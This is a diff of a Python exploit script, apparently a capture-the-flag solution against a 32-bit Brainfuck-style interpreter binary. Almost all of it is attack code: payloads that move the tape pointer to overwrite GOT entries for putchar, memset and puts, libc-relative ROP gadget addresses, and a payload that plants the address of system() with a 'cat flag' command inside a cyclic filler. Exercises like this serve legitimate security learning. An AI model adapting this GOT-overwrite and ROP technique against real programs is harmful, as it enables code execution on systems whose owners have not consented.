@@ -61,7 +61,7 @@ payload += b">" * 24 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # getchar - for getting the last char
 payload += b"." # trigger char
 payload += b"AAAABBBB" # payload
-payload += b"[" # call to puts()
+#payload += b"[" # call to puts()
 payload += b"\n" # call to puts()
 conn.send(payload)
 
@@ -94,8 +94,6 @@ print(f"putchar: {str(hex(putchar_addr))}")
 #pasted
 
 target = libc_addr + 0x001134d9 # add to esp
-my_rop = p32(target)
-print(f"ROP: {my_rop}")
 #payload = my_rop
 # I'm going to bulid a ROP chain here in the heap!
 heap_arbitrary_addr = 0x804b0a7
@@ -107,9 +105,12 @@ fgets_addr_in_main = 0x8048734
 memset_addr_in_main = 0x8048700
 # 2nd program iteration - 1st half
 payload = p32(memset_addr_in_main)
-payload += b"<"  * 7# decrease from putchar() GOT to memset() GOT address
-payload += b",>,>,>," # Setting the memset() GOT address
-payload += b"[" # call to puts()
+payload +=b"aaaabaaacaaa"
+payload += p32(system_addr)
+payload +=b"eaaafaaagcat flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
+payload += b"<"  * 27# decrease from putchar() GOT to puts() GOT address
+payload += b",>,>,>," # Setting the puts() GOT address
+payload += b"[" # Calling the puts() 
 payload += b"\n" # call to puts()
  # we can replace the address of memset with the address of system!
 conn.sendline(payload)
@@ -117,7 +118,11 @@ with open("payload", "ab+") as f:
     f.write(payload)
 
 # 2nd program iteration - 2nd half
-payload = b"AAAABBBB" # the new address of memset()
+add_esp = libc_addr + 0x0005b980 # pop ecx pop edx-1st pop to get rid of [ str
+payload = p32(add_esp) # the ADD ESP ROP address
+payload += b"AAAABBBB" # jump to memset() line
+payload += p32(0x8048700) # jump to memset() line
+payload += p32(0x22334455) # jump to memset() line
 payload += b"\n" # call to puts()
 conn.sendline(payload)
 
